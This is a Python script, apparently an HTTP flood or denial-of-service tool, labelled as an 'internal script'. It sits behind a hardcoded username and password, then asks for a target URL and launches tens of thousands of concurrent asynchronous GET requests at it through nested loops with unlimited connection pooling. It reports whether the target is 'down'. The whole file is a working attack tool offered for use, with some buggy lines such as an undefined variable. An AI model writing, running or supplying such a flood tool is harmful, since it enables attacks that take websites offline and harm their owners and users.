#!/usr/bin/python3
# -*- coding: utf-8 -*-
import os
import sys
import time
import fade
import asyncio
import aiohttp

NormalBlack = "\033[38;5;0m  \033[0m"
NormalRed = "\033[38;5;1m  \033[0m"
NormalGreen = "\033[38;5;2m  \033[0m"
NormalYellow = "\033[38;5;3m  \033[0m"
NormalBlue = "\033[38;5;4m  \033[0m"
NormalMagenta = "\033[38;5;5m  \033[0m"
NormalCyan = "\033[38;5;6m  \033[0m"
NormalWhite =  "\033[38;5;7m  \033[0m"
BrightBlack = "\033[48;5;0m  \033[0m"
BrightRed =  "\033[48;5;1m  \033[0m"
BrightGreen = "\033[48;5;2m  \033[0m"
BrightYellow = "\033[48;5;3m  \033[0m"
BrightBlue = "\033[48;5;4m  \033[0m"
BrightMagenta = "\033[48;5;5m  \033[0m"
BrightCyan = "\033[48;5;6m  \033[0m"
BrightWhite = "\033[48;5;7m  \033[0m"


# Clear command prompt based on the operating system
if os.name == "nt":  # Windows
    os.system("cls")
else:  # Unix/Linux/Mac
    os.system("clear")
attemps = 0
print("""
\033[33m                                                                               
╔══════════════════════════════════════════════════════════════╗
║\033[33m                ~ H U D A I R U L  A L - A Q S H A ~             \033[31m║
║\033[32m                    I N T E R N A L  S C R I P T                 \033[31m║
║\033[96m                           By: Aby'Walidein                      \033[31m║
║\033[37m                               ——o0o——                           \033[31m║
╚═══════════════════════════════════════════════════════════════╝
""")
while attemps < 100:
    username = input("\033[38;5;2mUsername: \033[0m")
    password = input("\033[38;5;2mPassword: \033[0m")

    if username == 'cebong' and password == 'go*block':
        print("\033[48;5;7m═⟩⟩ \033[0m")
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attemps += 1
        continue

url = input("\033[48;5;7m═⟩⟩ URL:\033[0m \033[32m\033[0m")
ask = fade.pinkred()
print("\033[32mLoading......")

async def increment_view_count(session):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                time.sleep(2)
                print("\033[48;5;3mInfo target \033[0m \033[33m" +str(url)+ " \033[35work\033[0m")
            else:
                time.sleep(2)
                print("\033[48;5;3mInfo target \033[0m \033[33m" +str(view_count)+ " \033[35work\033[0m")
    except aiohttp.ClientError as e:
        time.sleep(2)
        print("\033[33m" +str(url)+ "  \033[37mMaybe down!\033[0m")

async def main():
    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())            
